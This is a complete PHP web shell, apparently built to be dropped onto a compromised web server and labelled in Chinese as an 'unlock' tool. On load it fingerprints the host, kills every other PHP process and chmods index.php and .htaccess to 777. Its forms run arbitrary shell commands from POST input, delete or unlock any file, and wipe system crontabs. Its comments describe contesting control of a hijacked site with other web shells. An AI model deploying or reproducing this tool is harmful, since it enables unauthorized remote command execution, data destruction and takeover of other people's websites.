<?php
//36954
ini_set('display_errors',1);
ini_set('display_startup_errors',1);
error_reporting(-1);
if (function_exists('opcache_reset')) {
    opcache_reset();
}
echo "<h1>可达鸭-解锁专用文件 - Verion 0.2 2024-10-12</h1>";
if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
    if (function_exists('posix_getpwuid')) {
        $user_info = posix_getpwuid(posix_geteuid());
    } else {
        $user_info['user_info '] = "";
    }
}

$cronDirs = [
    '/etc/crontab',
    '/etc/cron.d/',
    '/var/spool/cron/crontabs/'
];


$current_pid = getmypid();

function listAndKillPhpProcesses($current_pid) {
    $exec_functions = ['exec', 'shell_exec', 'system', 'passthru', 'popen', 'proc_open'];
    $list_cmd = 'ps -e | grep php';
    $output = [];
    $kill_count = 0;

    foreach ($exec_functions as $function) {
        if (function_exists($function)) {
            switch ($function) {
                case "exec":
                    exec($list_cmd, $output);
                    break;
                case "shell_exec":
                    $output = explode("\n", shell_exec($list_cmd));
                    break;
                case "system":
                    ob_start();
                    system($list_cmd);
                    $output = explode("\n", ob_get_clean());
                    break;
                case "passthru":
                    ob_start();
                    passthru($list_cmd);
                    $output = explode("\n", ob_get_clean());
                    break;
                case "popen":
                    $fp = popen($list_cmd, "r");
                    while (!feof($fp)) {
                        $output[] = fgets($fp, 4096);
                    }
                    pclose($fp);
                    break;
                case "proc_open":
                    $descriptorspec = [
                        0 => ["pipe", "r"],
                        1 => ["pipe", "w"],
                        2 => ["pipe", "w"]
                    ];
                    $process = proc_open($list_cmd, $descriptorspec, $pipes);
                    $output = explode("\n", stream_get_contents($pipes[1]));
                    proc_close($process);
                    break;
            }
            if (!empty($output)) {
                break;
            }
        }
    }

    foreach ($output as $line) {
        echo $line . "\n";
        if (preg_match('/^\s*(\d+)/', $line, $matches)) {
            $pid = $matches[1];
            
            if ($pid == $current_pid) {
                echo "跳过本身 (PID: $pid)>><br>\n";
                continue;
            }

            $kill_cmd = "kill -9 $pid";
            
            foreach ($exec_functions as $function) {
                if (function_exists($function)) {
                    switch ($function) {
                        case 'exec':
                            exec($kill_cmd);
                            break;
                        case 'shell_exec':
                            shell_exec($kill_cmd);
                            break;
                        case 'system':
                            system($kill_cmd);
                            break;
                        case 'passthru':
                            passthru($kill_cmd);
                            break;
                        case 'popen':
                            $fp = popen($kill_cmd, "r");
                            pclose($fp);
                            break;
                        case 'proc_open':
                            $process = proc_open($kill_cmd, $descriptorspec, $pipes);
                            proc_close($process);
                            break;
                    }
                    $kill_count++;
                    echo "进程 $pid 已 Kill.⚔️<br>\n";
                    break;
                }
            }
        }
    }
    echo "共终止PHP进程数: $kill_count<br>\n";
}

function clearCronJobs($dirs) {
    foreach ($dirs as $dir) {
        if (is_file($dir)) {
            if (file_put_contents($dir, '') === false) {
                echo "无法清空文件: $dir";
                return false;
            } else {
                echo "成功清空文件: $dir";
            }
        } elseif (is_dir($dir)) {
            $files = glob($dir . '*');
            foreach ($files as $file) {
                if (is_file($file)) {
                    if (unlink($file)) {
                        echo "成功删除文件: $file";
                    } else {
                        echo "无法删除文件: $file";
                        return false;
                    }
                }
            }
        } else {
            echo "路径不存在或无效: $dir";
            return false;
        }
    }
    return true;
}


echo "当前系统用户: " . @$user_info['name'] . " | 当前脚本所有者: " . get_current_user();
echo "<hr>";
$os_info = php_uname();
echo "当前操作系统: " . $os_info . "<br>";
$server_ip = $_SERVER['SERVER_ADDR'] ?? '无法获取服务器 IP 地址';
echo "当前服务器 IP 地址: " . $server_ip;
echo "<br>当前 PHP 版本: " . phpversion();
echo "<br>服务器当前时间: " . date("Y-m-d H:i:s");
echo "<br>";
if (strpos(php_sapi_name(), 'fpm-fcgi') !== false) {
    echo "当前使用的是 <b style='color:green;'>PHP-FPM</b>";
    if (strpos($_SERVER['SERVER_SOFTWARE'], 'Apache') !== false) {
        echo "<br>当前运行在 Apache 服务器上。 可能满足PHP-FPM漏洞";
    }else{
        echo "<br>" . $_SERVER['SERVER_SOFTWARE'] . "<br>";
    }
} else {
    echo "当前没有使用 PHP-FPM。";
}
echo "<hr>";

function is_function_enabled($func_name) {
    return is_callable($func_name) && !in_array($func_name, explode(',', ini_get('disable_functions')));
}

$exec_enabled = is_function_enabled('exec');
$passthru_enabled = is_function_enabled('passthru');
$system_enabled = is_function_enabled('system');
$shell_exec_enabled = is_function_enabled('shell_exec');

$output = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['php_code'])) {
    $php_code = trim($_POST['php_code']);

    if ($exec_enabled) {
        $output = shell_exec($php_code);
    } else {
        $output = 'exec function is disabled.';
    }
}

if (is_function_enabled('proc_open')) {
    $process = proc_open('ps aux | grep php', [
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
    ], $pipes);

    if (is_resource($process)) {
        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        proc_close($process);
        echo "<h2>正在运行的 PHP 进程:</h2>";
        echo '<pre>' . htmlspecialchars($output) . '</pre>';
    }
} else {
    echo 'proc_open function is disabled or not available.';
}
echo "<hr>";
echo "加载的PHP扩展: " . implode(', ', get_loaded_extensions());
echo "<hr>";

function get_php_processes() {
    $php_processes = [];

    $process_dirs = glob('/proc/[0-9]*', GLOB_ONLYDIR);

    if (is_array($process_dirs)) {
        foreach ($process_dirs as $proc_dir) {
            $pid = basename($proc_dir);
            $cmdline_file = "/proc/$pid/cmdline";
            if (file_exists($cmdline_file)) {
                $cmdline = file_get_contents($cmdline_file);
                if (strpos($cmdline, 'php') !== false) {
                    $php_processes[] = $pid;
                }
            }
        }
    }
    return $php_processes;
}

$php_processes = get_php_processes();

if (!empty($php_processes)) {
    echo "<h2>正在运行的 PHP 进程:</h2><ul>";
    foreach ($php_processes as $process) {
        if (@is_array($process)) {
            echo "<li>PID: {$process['pid']}, CMD: {$process['cmdline']}</li>";
        } else {
            echo "<li>Invalid process data format</li>";
        }
    }
    echo "</ul>";
} else {
    echo "未找到正在运行的 PHP 进程。";
}
echo "<br>当前PHP脚本的进程ID: " . getmypid() . "<br>";

echo "<hr><h2>开始kill PHP进程...</h2>";
listAndKillPhpProcesses($current_pid);
echo "<hr>";

echo "<h2>检查定时任务</h2>";

$cron_files = [
    '/etc/crontab', 
    '/var/spool/cron/crontabs/', 
    '/etc/cron.d/'
];

foreach ($cron_files as $cron_file) {
    if (@is_file($cron_file) || @is_dir($cron_file)) {
        echo "<h2>内容来自 $cron_file</h2><pre>";
        if (@is_file($cron_file)) {
            echo htmlspecialchars(file_get_contents($cron_file));
        } else {
            $files = glob($cron_file . '*');
            foreach ($files as $file) {
                echo "<h3>$file</h3>";
                echo htmlspecialchars(file_get_contents($file));
            }
        }
        echo "</pre>";
    } else {
        echo "无法访问 $cron_file<br>";
    }
}

echo "<hr>";

$document_root = $_SERVER['DOCUMENT_ROOT'];
$index_file = $document_root . '/index.php';
$htaccess_file = $document_root . '/.htaccess';

if (file_exists($index_file)) {
    echo "文件路径: " . $index_file . "<br>";

    if (is_readable($index_file)) {
        echo "index.php 文件有读取权限。<br>";
    } else {
        echo "index.php 文件没有读取权限。<br>";
    }

    $last_modified_time = filemtime($index_file);
    echo "文件最后修改时间: " . date("Y-m-d H:i:s", $last_modified_time) . "<br>";
    $permissions = substr(sprintf('%o', fileperms($index_file)), -4);

    if (!is_writable($index_file)) {
        echo "🔒index.php 文件被锁定 (没有写权限)。<br>";

        if (chmod($index_file, 0777)) {
            echo "🔑文件权限成功修改为 777。<br>";
        } else {
            echo "💥修改文件权限失败。<br>";
        }
        @chmod($htaccess_file, 0777);
    } else {
        echo "🚩index.php 文件<b style='color:green;'>没有被锁🔓</b> (有写权限 ". $permissions . ")<br>";
        echo "👉通过大马，人工修改 index.php 并上挟持修改看看，改成功的话，查杀所有大小马。 持续观测几分钟，几小时看看还在不在，不在的话说明有其他备马或者漏洞<br>";
        echo "至于上锁继续用ww上锁工具和ww小火车守护试试，同时观测是否有争抢行为<br><br><br>";
    }

    $wp_config = $document_root . '/wp-config.php';
    if (file_exists($wp_config)) {
        echo "🌏该站点是 WordPress 站点, ";

        $wp_version_file = $document_root . '/wp-includes/version.php';
        if (file_exists($wp_version_file)) {
            $version_content = file_get_contents($wp_version_file);
            if (preg_match("/\\\$wp_version\s*=\s*'([^']+)';/", $version_content, $matches)) {
                $wp_version = $matches[1];
                echo "版本: " . $wp_version . "<br>";
            } else {
                echo "无法检测 WordPress 版本。<br>";
            }
        } else {
            echo "未找到 WordPress 版本文件。<br>";
        }
    } else {
        echo "该站点不是 WordPress 站点。<br>";
    }
} else {
    echo "index.php 文件不存在。<br>";
}

$output2 = '';
$action_message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file_action'])) {
    $file_path = trim($_POST['file_path']);
    
    // Kill all PHP processes before executing actions
    if ($exec_enabled) {
        shell_exec("pkill -f php");
    }

    // If "Unlock" button is clicked
    if ($_POST['file_action'] === 'unlock') {
        if (file_exists($file_path)) {
            if (chmod($file_path, 0777)) {
                $action_message = "文件 '$file_path' 成功解锁并设置为 777 权限。";
            } else {
                $action_message = "无法更改文件权限。";
            }
        } else {
            $action_message = "文件 '$file_path' 不存在。";
        }
    }

    if ($_POST['file_action'] === 'delete') {
        if (file_exists($file_path)) {
            chmod($file_path, 0777);
            if (unlink($file_path)) {
                $action_message = "文件 '$file_path' 成功删除。";
                if (file_exists($file_path)) {
                    $file_info = stat($file_path);
                    $mod_time = date("Y-m-d H:i:s", $file_info['mtime']);
                    $action_message .= "<br>文件仍然存在。文件属性: " . print_r($file_info, true) . "<br>最后修改时间: " . $mod_time;
                }
            } else {
                $action_message = "删除文件失败。";
            }
        } else {
            $action_message = "文件 '$file_path' 不存在。";
        }
    }

    if ($_POST['file_action'] === 'read') {
        if (file_exists($file_path)) {
            chmod($file_path, 0777);
            if (file_exists($file_path)) {
                $file_info = stat($file_path);
                $mod_time = date("Y-m-d H:i:s", $file_info['mtime']);
                $file_info = stat($file_path);  // Get file attributes

                $readable_info = [
                    '权限模式' => $file_info['mode'],
                    '用户ID（所有者）' => $file_info['uid'],
                    '组ID' => $file_info['gid'],
                    '最后访问时间' => date("Y-m-d H:i:s", $file_info['atime']),
                    '最后变更时间' => date("Y-m-d H:i:s", $file_info['ctime']),
                ];
                $action_message .= "<br>文件$file_path 仍然存在。<br>文件属性: " . print_r($readable_info, true) . "<br>最后修改时间: " . $mod_time;
            }
        }
    }

    if ($_POST['file_action'] === 'delete_cron') {
        if (clearCronJobs($cronDirs)) {
            echo "所有定时任务已清空。\n";
        } else {
            echo "清空定时任务时出错，请检查日志。\n";
        }
    }

}

echo "<hr>";

echo "<h2>输入指定单文件路径</h2>";
echo '<form method="POST">
        <textarea name="file_path" rows="3" cols="100" placeholder="输入单文件路径..."></textarea><br><br>
        <button type="submit" name="file_action" value="unlock">解锁</button>
        <button type="submit" name="file_action" value="delete">删除</button>
        <button type="submit" name="file_action" value="read">属性</button>
        <button type="submit" name="file_action" value="delete_cron">删除定时任务</button>
      </form>';

if ($action_message) {
    echo "<h3>结果:</h3><p>$action_message</p>";
}

echo "<hr>";
?>

<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex,nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>unLocker</title>
</head>
<body>
    <h2>执行环境检测 - 执行函数检查</h2>
    <ul>
        <li>exec: <?php echo $exec_enabled ? 'Enabled' : 'Disabled'; ?></li>
        <li>passthru: <?php echo $passthru_enabled ? 'Enabled' : 'Disabled'; ?></li>
        <li>system: <?php echo $system_enabled ? 'Enabled' : 'Disabled'; ?></li>
        <li>shell_exec: <?php echo $shell_exec_enabled ? 'Enabled' : 'Disabled'; ?></li>
    </ul>

    <h2>输入php代码开始执行</h2>
    <form method="POST">
        <textarea name="php_code" rows="5" cols="50" placeholder="Enter your command here..."></textarea><br><br>
        <input type="submit" value="提交执行">
    </form>

    <?php if (!empty($output)): ?>
        <h3>Output:</h3>
        <pre><?php echo htmlspecialchars($output); ?></pre>
    <?php endif; ?>
</body>
</html>